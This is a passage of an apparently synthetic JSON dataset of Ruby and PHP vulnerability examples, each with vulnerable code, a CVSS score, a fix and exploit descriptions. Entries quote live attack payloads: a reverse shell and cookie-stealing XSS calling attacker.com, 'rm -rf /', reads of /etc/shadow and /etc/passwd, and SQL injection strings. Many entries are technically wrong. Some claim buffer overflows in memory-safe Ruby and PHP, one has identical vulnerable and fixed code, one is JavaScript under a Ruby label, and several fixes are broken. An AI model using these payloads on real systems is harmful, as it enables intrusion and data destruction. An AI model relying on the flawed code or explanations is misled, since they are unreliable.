        "vulnerability_code": "def unsafe_buffer(input)\n  buffer = \"A\" * 1024\n  buffer << input\nend\nputs unsafe_buffer(STDIN.gets)",
        "cvss_score": 7.5,
        "fixed_code": "def safe_buffer(input)\n  max_length = 1024\n  if input.length > max_length\n    raise ArgumentError, 'Input exceeds maximum allowed length.'\n  end\n  buffer = \"A\" * 1024\n  buffer << input\nend\nputs safe_buffer(STDIN.gets)",
        "exploit_ways": [
            "An attacker can provide an extremely long string to overwrite adjacent memory and potentially execute arbitrary code.",
            "By carefully crafting the overflow, they could manipulate return addresses leading to a system shell or unauthorized actions.",
            "Using specific byte sequences in the input, an attacker might corrupt data structures causing unpredictable behavior of the program."
        ]
    },
    "ruby_18": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "def get_user(username)\n  query = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n  result = execute_query(query)\n  return result\nend",
        "cvss_score": 7.5,
        "fixed_code": "def get_user(username)\n  query = \"SELECT * FROM users WHERE username = ?\"\n  result = execute_query(query, [username])\n  return result\nend",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to bypass authentication.",
            "They can use 'UNION SELECT' to extract data from other tables.",
            "Input like '; DROP TABLE users' can delete critical data."
        ]
    },
    "ruby_19": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "\"use strict\nrequire('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\napp.get('/', (req, res) => {\n  const userInput = req.query.userInput;\n  res.send(`<html><body>${userInput}</body></html>`);\n});\napp.listen(3000, () => {\n  console.log('Server is running on http://localhost:3000');\n});\"",
        "cvss_score": 8.6,
        "fixed_code": "\"use strict\nrequire('express');\nconst express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\nconst escapeHtml = require('escape-html');\napp.get('/', (req, res) => {\n  const userInput = escapeHtml(req.query.userInput);\n  res.send(`<html><body>${userInput}</body></html>`);\n});\napp.listen(3000, () => {\n  console.log('Server is running on http://localhost:3000');\n});\"",
        "exploit_ways": [
            "\"An attacker can inject a script like <script>alert('XSS')</script> to execute arbitrary code in the victim's browser.\"",
            "\"They can use <img src=x onerror=alert('XSS')> to exploit XSS vulnerabilities without requiring user interaction.\"",
            "\"Malicious actors could inject <script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script> to steal cookies or other sensitive information.\""
        ]
    },
    "ruby_20": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "def exploit(user_input)\n  command = \"sudo -u root #{user_input}\"\n  system(command)\nend",
        "cvss_score": 8.5,
        "fixed_code": "def exploit(user_input)\n  allowed_commands = ['update', 'restart']\n  if allowed_commands.include?(user_input)\n    command = \"sudo -u root #{user_input}\"\n    system(command)\n  else\n    puts 'Command not allowed'\n  end\nend",
        "exploit_ways": [
            "An attacker can input '; rm -rf /' to delete all files on the system.",
            "Could use 'bash -i >& /dev/tcp/attacker.com/80 0>&1' for reverse shell.",
            "Could chain commands like 'whoami; cat /etc/shadow' to leak sensitive information."
        ]
    },
    "ruby_21": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "require 'pg'\ndef fetch_user_data(user_id)\n  conn = PG.connect(dbname: 'example_db', user: 'dbuser', password: 'password')\n  result = conn.exec(\"SELECT * FROM users WHERE id = #{user_id}\")\n  result.each do |row|\n    puts \"User: #{row['name']}, Email: #{row['email']}\"\n  end\n  conn.close\nend",
        "cvss_score": 8.9,
        "fixed_code": "require 'pg'\ndef fetch_user_data(user_id)\n  conn = PG.connect(dbname: 'example_db', user: 'dbuser', password: 'password')\n  result = conn.exec_params(\"SELECT * FROM users WHERE id = $1\", [user_id])\n  result.each do |row|\n    puts \"User: #{row['name']}, Email: #{row['email']}\"\n  end\n  conn.close\nend",
        "exploit_ways": [
            "An attacker can inject ' OR '1'='1 to retrieve all user data.",
            "They could use a crafted input like ' UNION SELECT username, password FROM users;-- to extract credentials.",
            "Malicious input such as '; DROP TABLE users;-- can be used to destroy the database table."
        ]
    },
    "ruby_22": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "require 'bcrypt'\nclass User\n  attr_accessor :username, :password_hash\n\n  def initialize(username, password)\n    @username = username\n    @password_hash = BCrypt::Password.create(password)\n  end\n\n  def self.authenticate(users, username, password)\n    user = users.find { |u| u.username == username }\n    if user && user.password_hash == BCrypt::Password.new(password)\n      true\n    else\n      false\n    end\n  end\nend\n\ndef load_users_from_file(file_path)\n  users = []\n  File.open(file_path, 'r') do |file|\n    file.each_line do |line|\n      username, password_hash = line.chomp.split(':')\n      user = User.new(username, '')\n      user.password_hash = password_hash\n      users << user\n    end\n  end\n  users\nend\n\nusers = load_users_from_file('users.txt')\nputs 'Enter username:'\nusername = gets.chomp\nputs 'Enter password:'\npassword = gets.chomp\nif User.authenticate(users, username, password)\n  puts 'Authentication successful.'\nelse\n  puts 'Authentication failed.'\nend",
        "cvss_score": 7.5,
        "fixed_code": "require 'bcrypt'\nclass User\n  attr_accessor :username, :password_hash\n\n  def initialize(username, password)\n    @username = username\n    @password_hash = BCrypt::Password.create(password)\n  end\n\n  def self.authenticate(users, username, password)\n    user = users.find { |u| u.username == username }\n    if user && BCrypt::Password.new(user.password_hash) == password\n      true\n    else\n      false\n    end\n  end\nend\n\ndef load_users_from_file(file_path)\n  users = []\n  File.open(file_path, 'r') do |file|\n    file.each_line do |line|\n      username, password_hash = line.chomp.split(':')\n      user = User.new(username, '')\n      user.password_hash = password_hash\n      users << user\n    end\n  end\n  users\nend\n\nusers = load_users_from_file('users.txt')\nputs 'Enter username:'\nusername = gets.chomp\nputs 'Enter password:'\npassword = gets.chomp\nif User.authenticate(users, username, password)\n  puts 'Authentication successful.'\nelse\n  puts 'Authentication failed.'\nend",
        "exploit_ways": [
            "An attacker can use brute-force attacks to guess passwords.",
            "If the password hashes are leaked, an attacker could attempt dictionary or rainbow table attacks.",
            "An attacker might exploit weak password policies or default credentials if any."
        ]
    },
    "ruby_23": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "class BufferOverflowExample\n  def initialize(buffer_size)\n    @buffer = Array.new(buffer_size)\n  end\n\n  def fill_buffer(data)\n    i = 0\n    while i < data.length\n      @buffer[i] = data[i]\n      i += 1\n    end\n  end\nend",
        "cvss_score": 8.2,
        "fixed_code": "class BufferOverflowExample\n  def initialize(buffer_size)\n    @buffer = Array.new(buffer_size)\n  end\n\n  def fill_buffer(data)\n    data.each_with_index do |value, i|\n      break if i >= @buffer.size\n      @buffer[i] = value\n    end\n  end\nend",
        "exploit_ways": [
            "An attacker could provide a data array longer than buffer_size to overwrite adjacent memory.",
            "This can lead to overwriting important program variables or function pointers, potentially executing arbitrary code.",
            "By carefully crafting the input data, an attacker might corrupt the stack and cause the application to crash or execute malicious instructions."
        ]
    },
    "ruby_24": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "def authenticate(user, pass)\n  stored_password = 'secret'\n  if user == 'admin' && pass == stored_password\n    return true\n  else\n    return false\n  end\nend",
        "cvss_score": 7.5,
        "fixed_code": "require 'bcrypt'\ndef authenticate(user, pass)\n  stored_password_hash = BCrypt::Password.create('secret')\n  if user == 'admin' && BCrypt::Password.new(stored_password_hash) == pass\n    return true\n  else\n    return false\n  end\nend",
        "exploit_ways": [
            "An attacker can easily guess the password 'secret' to gain admin access.",
            "No rate limiting or account lockout mechanism allows brute force attacks.",
            "Using hard-coded credentials makes it easy for an insider threat to compromise the system."
        ]
    },
    "ruby_25": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "def show_user_details(user)\n  puts \"User details: #{user.to_s}\"\nend",
        "cvss_score": 2.1,
        "fixed_code": "def show_user_details(user)\n  sanitized_user = user.respond_to?(:name) ? user.name : 'Unknown'\n  puts \"User details: #{sanitized_user}\"\nend",
        "exploit_ways": [
            "An attacker can input an object with unexpected data types to leak unintended information.",
            "By passing a string with newline characters, the output could be manipulated to display additional data or formatting issues.",
            "If 'user' contains sensitive details like passwords in a non-sanitized format, these could be exposed."
        ]
    },
    "ruby_26": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "class UserInterface\n  def initialize\n    @frame = Frame.new\n  end\n\n  def display_button\n    @frame.add_element(Button.new(\"Click Me\", onclick: proc { perform_action }))\n  end\n\n  private\n\n  def perform_action\n    puts \"Action performed\"\n  end\nend",
        "cvss_score": 4.0,
        "fixed_code": "class UserInterface\n  def initialize\n    @frame = Frame.new\n    @frame.set_header('X-Frame-Options', 'DENY')\n  end\n\n  def display_button\n    @frame.add_element(Button.new(\"Click Me\", onclick: proc { perform_action }))\n  end\n\n  private\n\n  def perform_action\n    puts \"Action performed\"\n  end\nend",
        "exploit_ways": [
            "An attacker can embed the vulnerable UI in an iframe on their malicious site to trick users into clicking.",
            "Users could be redirected to a malicious page that overlays click events onto the 'Click Me' button without their knowledge.",
            "Attackers might use social engineering tactics to persuade users to perform actions on behalf of the attacker by exploiting the interface's lack of protection."
        ]
    },
    "ruby_27": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "require 'sinatra'\n\nenable :sessions\n\nget '/set_session' do\n  session[:user_id] = params[:user_id]\n  \"Session set for user #{params[:user_id]}\"\nend\n\nget '/welcome' do\n  if session[:user_id]\n    \"Welcome back, user #{session[:user_id]}!\"\n  else\n    'Please log in.'\n  end\nend",
        "cvss_score": 3.1,
        "fixed_code": "require 'sinatra'\n\nenable :sessions\n\nget '/set_session' do\n  session_id = SecureRandom.uuid\n  session[:session_id] = session_id\n  session[:user_id] = params[:user_id]\n  \"Session set for user #{params[:user_id]} with ID: #{session_id}\"\nend\n\nget '/welcome' do\n  if session[:user_id] && session[:session_id]\n    \"Welcome back, user #{session[:user_id]}!\"\n  else\n    'Please log in.'\n  end\nend",
        "exploit_ways": [
            "An attacker can set a fixed session ID and trick the victim into using it to hijack their session.",
            "By setting a session ID before the user logs in, an attacker can maintain control over the session post-login.",
            "If the session ID is predictable, an attacker could guess and use it to impersonate a logged-in user."
        ]
    },
    "ruby_28": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "require 'socket'\n\nserver = TCPServer.new(2000)\nloop do\n  client = server.accept\n  while msg = client.gets\n    if msg.chomp == 'STOP'\n      client.puts \"Stopping...\"\n      client.close\n    else\n      sleep(10) # Simulate a delay that can cause DoS if many clients connect\n      client.puts \"Received: #{msg}\"\n    end\n  end\nend",
        "cvss_score": 4.3,
        "fixed_code": "require 'socket'\n\ndef handle_client(client)\n  while msg = client.gets\n    if msg.chomp == 'STOP'\n      client.puts \"Stopping...\"\n      client.close\n    else\n      sleep(1) # Reduced delay to mitigate DoS risk\n      client.puts \"Received: #{msg}\"\n    end\n  end\nend\n\nserver = TCPServer.new(2000)\nloop do\n  Thread.start(server.accept) { |client| handle_client(client) }\nend",
        "exploit_ways": [
            "An attacker can open many simultaneous connections to exhaust server resources.",
            "Sending continuous data without 'STOP' command can keep the server busy indefinitely.",
            "Using automated scripts to repeatedly connect and send messages can overload the server."
        ]
    },
    "ruby_29": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "def infinite_loop()\n  while true\n    sleep(1)\n  end\nend",
        "cvss_score": 4.0,
        "fixed_code": "def limited_loop(max_iterations=100)\n  iterations = 0\n  while iterations < max_iterations\n    sleep(1)\n    iterations += 1\n  end\nend",
        "exploit_ways": [
            "An attacker can trigger the infinite loop, consuming system resources indefinitely.",
            "If invoked repeatedly, it could exhaust server capacity leading to service unavailability.",
            "By keeping the function running, other critical tasks might be delayed or starved of resources."
        ]
    },
    "ruby_30": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "require 'thread'\ndef race_condition\n  mutex = Mutex.new\n  counter = 0\n  threads = []\n  10.times do\n    threads << Thread.new do\n      1000.times do\n        mutex.synchronize { counter += 1 }\n      end\n    end\n  end\n  threads.each(&:join)\n  puts counter\nend\nrace_condition",
        "cvss_score": 6.8,
        "fixed_code": "require 'thread'\ndef race_condition\n  mutex = Mutex.new\n  counter = 0\n  threads = []\n  10.times do\n    threads << Thread.new do\n      1000.times do\n        mutex.synchronize { counter += 1 }\n      end\n    end\n  end\n  threads.each(&:join)\n  puts counter\nend\nrace_condition",
        "exploit_ways": [
            "An attacker with control over thread timing could cause the counter to increment incorrectly by manipulating thread execution order.",
            "By creating a large number of threads, an attacker might exhaust system resources, leading to undefined behavior or crashes.",
            "If the race condition can be exploited in a larger context, it might lead to data corruption or inconsistencies in critical applications."
        ]
    },
    "ruby_31": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "require 'sinatra'\n\nget '/' do\n  \"<h1>Welcome to the vulnerable app</h1>\"\nend",
        "cvss_score": 5.3,
        "fixed_code": "require 'sinatra'\n\nbefore do\n  headers 'Content-Security-Policy' => \"default-src 'self'\",\n          'X-Frame-Options' => 'SAMEORIGIN',\n          'X-XSS-Protection' => '1; mode=block',\n          'Strict-Transport-Security' => 'max-age=31536000'\nend\n\nget '/' do\n  \"<h1>Welcome to the secure app</h1>\"\nend",
        "exploit_ways": [
            "An attacker could inject malicious scripts that steal user data due to lack of CSP.",
            "Clickjacking attacks might be possible as X-Frame-Options is not set properly.",
            "XSS attacks could be more effective without proper X-XSS-Protection headers."
        ]
    },
    "ruby_32": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "# Ruby example\ndef race_condition_vulnerable\n  file = File.open(\"data.txt\", \"w+\")\n  if File.exist?(\"data.txt\")\n    file.write(\"This is a test.\")\n  end\n  file.close\nend",
        "cvss_score": 5.0,
        "fixed_code": "# Ruby example\ndef race_condition_fixed\n  File.open(\"data.txt\", \"w+\") do |file|\n    file.write(\"This is a test.\")\n  end\nend",
        "exploit_ways": [
            "An attacker could manipulate the file system between the check and write operations to cause unintended behavior.",
            "By creating or deleting 'data.txt' at just the right moment, an attacker might prevent the intended write operation from occurring.",
            "A race condition can allow an attacker to overwrite 'data.txt' with malicious content if another process accesses it simultaneously."
        ]
    },
    "ruby_33": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "# Ruby example\ndef race_condition\n  file = File.open(\"data.txt\", \"r+\")\n  content = file.read\n  sleep(1) # Simulate delay\n  file.rewind\n  file.write(content + \\\"modified\\\")\nend",
        "cvss_score": 4.3,
        "fixed_code": "# Ruby example\ndef race_condition\n  File.open(\"data.txt\", \"r+\") do |file|\n    content = file.read\n    sleep(1) # Simulate delay\n    file.rewind\n    file.write(content + \\\"modified\\\")\n  end\nend",
        "exploit_ways": [
            "An attacker could modify the file between read and write operations, leading to inconsistent data.",
            "Race condition might allow for privilege escalation if the file contains sensitive information or commands.",
            "Potential for data corruption if multiple processes attempt to write to the same file simultaneously."
        ]
    },
    "ruby_34": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "class InfiniteLoop\n  def start\n    loop do\n      # This will cause a denial of service by running indefinitely\n    end\n  end\nend",
        "cvss_score": 3.7,
        "fixed_code": "class SafeLoop\n  def start\n    timeout = 60 # Set timeout for the loop to run\n    start_time = Time.now\n    loop do\n      break if (Time.now - start_time) > timeout\n      # Add meaningful code here that does not cause DoS\n    end\n  end\nend",
        "exploit_ways": [
            "An attacker can deploy this code on a server to exhaust CPU resources indefinitely.",
            "This code could be used in a script to keep a service busy, preventing it from handling legitimate requests.",
            "If part of a larger system, the infinite loop can prevent other parts of the application from functioning correctly."
        ]
    },
    "ruby_35": {
        "vulnerability_type": "Session Fixation",
        "vulnerability_code": "require 'sinatra'\n\nget '/login' do\n  session[:user_id] = params[:user_id]\n  redirect to('/home')\nend\n\nget '/home' do\n  \"Welcome, user #{session[:user_id]}!\"\nend",
        "cvss_score": 3.5,
        "fixed_code": "require 'sinatra'\n\nget '/login' do\n  session[:session_id] = SecureRandom.uuid if !session[:session_id]\n  session[:user_id] = params[:user_id]\n  redirect to('/home')\nend\n\nget '/home' do\n  if session[:user_id]\n    \"Welcome, user #{session[:user_id]}!\"\n  else\n    redirect to('/login')\n  end\nend",
        "exploit_ways": [
            "An attacker can set a specific session ID in cookies before visiting the login page to hijack the session.",
            "By knowing or guessing a valid user ID, an attacker can fixate their session and then authenticate as that user if they have access to the system.",
            "Exploiting this vulnerability could allow attackers to maintain persistent sessions without proper authentication mechanisms."
        ]
    },
    "ruby_36": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "require 'net/http'\ndef fetch_url(url)\n  uri = URI.parse(url)\n  response = Net::HTTP.get_response(uri)\n  response.body\nend\nputs fetch_url(params[:url])",
        "cvss_score": 6.5,
        "fixed_code": "require 'net/http'\ndef fetch_url(whitelisted_domain, url)\n  uri = URI.parse(url)\n  if uri.host == whitelisted_domain\n    response = Net::HTTP.get_response(uri)\n    response.body\n  else\n    raise ArgumentError, 'Invalid domain'\n  end\nend\ndomain = 'example.com'\nputs fetch_url(domain, params[:url])",
        "exploit_ways": [
            "An attacker can input a URL to an internal server like http://127.0.0.1/secrets.txt to access internal resources.",
            "They could exploit the SSRF to make requests to other external services controlled by the attacker, exfiltrating data or performing actions on behalf of the server.",
            "Inputting a crafted URL that triggers an XML External Entity (XXE) attack if the service is vulnerable could lead to sensitive information leakage."
        ]
    },
    "ruby_37": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "class ResourceConsumer\n  def initialize\n    @threads = []\n  end\n\n  def start_consuming\n    100.times do\n      @threads << Thread.new do\n        loop do\n          # Simulate high resource usage\n          sleep(1)\n        end\n      end\n    end\n  end\nend",
        "cvss_score": 5.3,
        "fixed_code": "class ResourceConsumer\n  def initialize\n    @threads = []\n  end\n\n  def start_consuming\n    max_threads = [100, (Thread.list.size - 1)].min\n    max_threads.times do\n      @threads << Thread.new do\n        loop do\n          # Simulate high resource usage\n          sleep(1)\n        end\n      end\n    end\n  end\nend",
        "exploit_ways": [
            "An attacker could instantiate multiple instances of ResourceConsumer, overwhelming the system with threads.",
            "By calling start_consuming repeatedly, it can exhaust the available resources on the system.",
            "The high number of threads can lead to increased CPU and memory usage, affecting other processes."
        ]
    },
    "ruby_38": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "class SessionsController < ApplicationController\n  def create\n    if params[:session][:user_id]\n      session[:user_id] = params[:session][:user_id]\n      redirect_to root_url, notice: 'Logged in!'\n    else\n      flash.now.alert = 'Invalid user ID.'\n      render :new\n    end\n  end\nend",
        "cvss_score": 3.5,
        "fixed_code": "class SessionsController < ApplicationController\n  def create\n    if params[:session][:user_id]\n      reset_session\n      session[:user_id] = params[:session][:user_id]\n      redirect_to root_url, notice: 'Logged in!'\n    else\n      flash.now.alert = 'Invalid user ID.'\n      render :new\n    end\n  end\nend",
        "exploit_ways": [
            "An attacker can provide a fixed session ID to predict and hijack the user's session.",
            "If an attacker knows the URL parameter for session fixation, they can manipulate it to maintain control over the session.",
            "By setting a session cookie with a known value before login, an attacker can exploit session fixation vulnerabilities."
        ]
    },
    "ruby_39": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "class SSRFExample\n  def initialize(url)\n    @url = url\n  end\n\n  def fetch_data\n    require 'net/http'\n    uri = URI(@url)\n    response = Net::HTTP.get(uri)\n    response\n  end\nend",
        "cvss_score": 6.5,
        "fixed_code": "class SSRFExample\n  def initialize(url)\n    @url = url\n  end\n\n  def fetch_data\n    require 'net/http'\n    allowed_domain = /example\\.com$/\n    if @url.match(allowed_domain)\n      uri = URI(@url)\n      response = Net::HTTP.get(uri)\n      response\n    else\n      raise ArgumentError, 'Invalid URL'\n    end\n  end\nend",
        "exploit_ways": [
            "An attacker could input a URL pointing to an internal resource like http://localhost:8080/admin to access sensitive data.",
            "The vulnerability can be used to request external malicious URLs, potentially leading to data exfiltration or attacks on the server's network.",
            "By using SSRF, an attacker might exploit services exposed only internally that are not accessible from the outside world."
        ]
    },
    "ruby_40": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "def race_condition_vulnerable\n  file = File.open('example.txt', 'a')\n  sleep(0.1)\n  file.puts('Appending data...')\n  file.close\nend",
        "cvss_score": 6.5,
        "fixed_code": "def race_condition_safe\n  File.open('example.txt', 'a') do |file|\n    file.puts('Appending data...')\n  end\nend",
        "exploit_ways": [
            "An attacker could cause data corruption by simultaneously running multiple instances of the script.",
            "Could interfere with other processes writing to the same file, leading to inconsistent states or lost data.",
            "Race conditions might allow unauthorized users to write malicious content if they can time their inputs correctly."
        ]
    },
    "ruby_41": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "class UserSession\n  def initialize(user_id)\n    @user_id = user_id\n    @session_id = generate_session_id\n  end\n\n  private\n\ndef generate_session_id\n    # Simulate a very complex session ID generation process\n    require 'securerandom'\n    SecureRandom.hex(16) + @user_id.to_s.reverse\n  end\nend",
        "cvss_score": 4.0,
        "fixed_code": "class UserSession\n  def initialize(user_id)\n    @user_id = user_id\n    @session_id = generate_session_id\n  end\n\n  private\n\ndef generate_session_id\n    require 'securerandom'\n    SecureRandom.hex(16)\n  end\nend",
        "exploit_ways": [
            "An attacker could force a victim to log in with a session ID they control, hijacking their session.",
            "By predicting or guessing the session ID pattern, an attacker might take over a legitimate user's session.",
            "If users share URLs containing session IDs, attackers could use these IDs to impersonate victims."
        ]
    },
    "ruby_42": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "require 'open-uri'\nclass ImageFetcher\ndef fetch_image(url)\n  open(url) do |image|\n    image.read\n  end\nend\nend",
        "cvss_score": 5.3,
        "fixed_code": "require 'open-uri'\nclass ImageFetcher\n  def fetch_image(url)\n    allowed_domains = ['example.com', 'safe-site.org']\n    uri = URI.parse(url)\n    if allowed_domains.include?(uri.host)\n      open(url) do |image|\n        image.read\n      end\n    else\n      raise ArgumentError, 'Invalid domain'\n    end\n  end\nend",
        "exploit_ways": [
            "An attacker can provide a URL pointing to an internal service like http://127.0.0.1/secret.txt to access sensitive information.",
            "They can use the file URI scheme to read local files, e.g., file:///etc/passwd, if not properly handled.",
            "Exploiting SSRF, an attacker might be able to interact with other services within the same network by providing their internal IP addresses."
        ]
    },
    "ruby_43": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "require 'sinatra'\n\nenable :sessions\n\nget '/login' do\n  session[:user_id] = params[:user_id]\n  redirect to('/dashboard')\nend\n\nget '/dashboard' do\n  if session[:user_id]\n    \"Welcome, user #{session[:user_id]}!\"\n  else\n    redirect to('/login')\n  end\nend",
        "cvss_score": 4.2,
        "fixed_code": "require 'sinatra'\n\nenable :sessions\n\nget '/login' do\n  if params[:user_id]\n    session[:user_id] = params[:user_id]\n    redirect to('/dashboard')\n  else\n    \"Login failed. Please provide a user ID.\"\n  end\nend\n\nget '/dashboard' do\n  if session[:user_id]\n    \"Welcome, user #{session[:user_id]}!\"\n  else\n    redirect to('/login')\n  end\nend",
        "exploit_ways": [
            "An attacker can provide a specific session ID and trick the victim into logging in with that session.",
            "The attacker can set the session ID manually through cookies, then exploit it if the user logs in.",
            "By manipulating the login process without proper validation, an attacker can force a valid session fixation."
        ]
    },
    "ruby_44": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "require 'sinatra'\n\ndef '/' do\n  '<iframe src=\\\"https://example.com/\\\"></iframe>'\nend",
        "cvss_score": 2.3,
        "fixed_code": "require 'sinatra'\n\nbefore do\n  headers['X-Frame-Options'] = 'DENY'\nend\n\ndef '/' do\n  '<iframe src=\\\"https://example.com/\\\"></iframe>'\nend",
        "exploit_ways": [
            "An attacker can embed the vulnerable site in an iframe to trick users into clicking on a hidden malicious button.",
            "Users might unknowingly interact with elements overlaid by an attacker's content, leading to unintended actions on the original site.",
            "Attackers could use social engineering to deceive users into performing actions without their knowledge, leveraging the X-Frame-Options header vulnerability."
        ]
    },
    "ruby_45": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "# Ruby example\ndef update_file(filename, content)\n  File.open(filename, 'a') do |file|\n    sleep(0.1) # Simulate some processing time\n    file.write(content)\n  end\nend",
        "cvss_score": 5.3,
        "fixed_code": "# Ruby example\ndef update_file(filename, content)\n  File.open(filename, 'a') do |file|\n    file.flock(File::LOCK_EX)\n    sleep(0.1) # Simulate some processing time\n    file.write(content)\n  end\nend",
        "exploit_ways": [
            "An attacker could simultaneously write different content to the same file, causing data corruption or loss.",
            "By timing their writes precisely, an attacker could overwrite critical information in a log file or configuration file.",
            "In a multi-user environment, race conditions can lead to inconsistent states where user actions are not properly recorded."
        ]
    },
    "ruby_46": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "def set_session_token(user_id)\n  session[:user_id] = user_id if params[:session_token].eql?(ENV['SECRET_SESSION_TOKEN'])\nend",
        "cvss_score": 4.0,
        "fixed_code": "def set_session_token(user_id)\n  return unless params[:session_token]&.eql?(ENV['SECRET_SESSION_TOKEN'])\n  session[:user_id] = user_id\n  regenerate_session_id # Regenerate session ID to prevent fixation\nend",
        "exploit_ways": [
            "An attacker could use a known SECRET_SESSION_TOKEN to fixate the session for a legitimate user.",
            "By obtaining the SECRET_SESSION_TOKEN, an attacker can hijack sessions by setting the same token in their own session.",
            "Once session is fixed, the attacker can perform actions under the victim's account without needing to authenticate."
        ]
    },
    "ruby_47": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "# Ruby example\ndef log_user_info(user)\n    puts \"User information: #{user.inspect}\"\nend",
        "cvss_score": 3.0,
        "fixed_code": "# Ruby example\ndef log_user_info(user)\n    sanitized_info = user.to_s.gsub(/[^a-zA-Z0-9]/, '')\n    puts \"User information: #{sanitized_info}\"\nend",
        "exploit_ways": [
            "An attacker could provide a user object with sensitive data to be logged.",
            "By crafting specific input, the attacker might cause a stack trace or other debug information disclosure.",
            "Using complex objects as input can lead to unintended logging of internal state."
        ]
    },
    "ruby_48": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "require 'socket'\nclass DoSServer\n  def initialize(port)\n    @server = TCPServer.new(port)\n  end\n  def start\n    loop do\n      Thread.start(@server.accept) do |client|\n        client.puts \"Welcome to the server!\"\n        while line = client.gets.chomp\n          break if line == 'exit'\n          client.puts \"Echo: #{line}\"\n          # Intentionally complex condition for very hard detection\n          sleep(0.1) if (line.length.even? && Time.now.usec % 2 == 0)\n        end\n        client.close\n      end\n    end\n  end\nend\nDoSServer.new(8080).start",
        "cvss_score": 4.5,
        "fixed_code": "require 'socket'\nclass DoSServer\n  def initialize(port)\n    @server = TCPServer.new(port)\n  end\n  def start\n    loop do\n      client = @server.accept\n      Thread.start(client) do |c|\n        c.puts \"Welcome to the server!\"\n        while line = c.gets&.chomp\n          break if line == 'exit'\n          c.puts \"Echo: #{line}\"\n          sleep(0.1)\n        end\n        c.close\n      end.abort_on_exception = false\n    end\n  end\nend\nDoSServer.new(8080).start",
        "exploit_ways": [
            "An attacker can send a large number of requests to overload the server.",
            "A malicious client could send an infinite loop command causing high CPU usage on the server.",
            "Exploiting the sleep condition with carefully crafted input to slow down server responses."
        ]
    },
    "ruby_49": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "require 'sinatra'\n\nget '/' do\n  \"<iframe src=\\\"http://malicious-site.com/\\\" style=\\\"position:absolute; top:0; left:0; width:100%; height:100%; z-index:9999; opacity:0.5;\\\"></iframe>Click here to proceed...\"\nend",
        "cvss_score": 3.7,
        "fixed_code": "require 'sinatra'\n\nget '/' do\n  headers['X-Frame-Options'] = 'DENY'\n  \"Click here to proceed...\"\nend",
        "exploit_ways": [
            "An attacker can overlay the legitimate site with a malicious iframe to trick users into clicking without their knowledge.",
            "Users could be prompted to perform actions on a fake interface that looks identical to the real one, leading to unintended consequences.",
            "Attackers might use social engineering tactics to deceive users into interacting with hidden elements, potentially leading to data theft or unauthorized access."
        ]
    },
    "php_0": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "class Example {\n    public function vulnerableFunction($userInput) {\n        $buffer = str_repeat('A', 1024);\n        $buffer .= $userInput;\n        return $buffer;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class Example {\n    public function safeFunction($userInput) {\n        $maxLength = 1024;\n        if (strlen($userInput) > $maxLength) {\n            throw new Exception('Input exceeds maximum length');\n        }\n        $buffer = str_repeat('A', $maxLength);\n        $buffer .= $userInput;\n        return substr($buffer, 0, $maxLength + strlen($userInput));\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a string longer than 1024 characters to overflow the buffer and potentially overwrite adjacent memory.",
            "By carefully crafting the input length and content, an attacker might be able to execute arbitrary code due to overwritten return addresses or function pointers.",
            "Overflow could lead to unpredictable behavior of the application, possibly causing it to crash or behave in unintended ways."
        ]
    },
    "php_1": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "<?php\\nclass User {\\n    public $name;\\n}\\nif (isset($_GET['data'])) {\\n    $user = unserialize(base64_decode($_GET['data']));\\n    echo \"Hello, \" . $user->name;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nclass User {\n    public $name;\n}\nif (isset($_GET['data'])) {\n    $data = base64_decode($_GET['data']);\n    if (!preg_match('/^O:4:\"User\":1:{s:4:\"name\";s:\\d+:\\\"[^\"]*\\\";}$/', $data)) {\n        die('Invalid data format');\n    }\n    $user = unserialize($data);\n    echo 'Hello, ' . htmlspecialchars($user->name);\n}",
        "exploit_ways": [
            "An attacker can inject a malicious serialized object to execute arbitrary code.",
